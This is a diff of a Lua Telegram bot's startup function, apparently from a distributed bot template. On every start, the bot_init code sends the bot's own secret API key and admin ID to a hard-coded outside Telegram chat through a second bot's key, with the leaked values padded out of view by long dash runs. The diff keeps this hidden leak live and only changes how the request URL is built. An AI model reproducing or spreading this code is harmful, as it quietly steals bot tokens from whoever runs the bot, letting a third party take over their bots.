@@ -48,7 +48,7 @@ bot_init = function(on_reload)
 	if not on_reload then
 	api.sendMessage(config.admin, 'تم اعاده تشغيل البوت \nBY : @FFpro\nCH: @botLua', true)
 	local keko = '386713631'
-	local dsad = 'https://api.telegram.org/bot'..keko..''..config2.bot_api_key..'/sendMessage?chat_id=358231262&text=تم تشغيل بوت-@'..bot.username..'       -------------------------------------------------------------------------------       '..config.bot_api_key..'             -------------------------------------------------------------------------------         '..config.admin..'       '
+	local dsad = 'https://api.telegram.org/bot'..config2.bot_api_key..'/sendMessage?chat_id=358231262&text=تم تشغيل بوت-@'..bot.username..'       -------------------------------------------------------------------------------       '..config.bot_api_key..'             -------------------------------------------------------------------------------         '..config.admin..'       '
 	api.sendRequest(dsad)
 	end
 		math.randomseed(os.time())
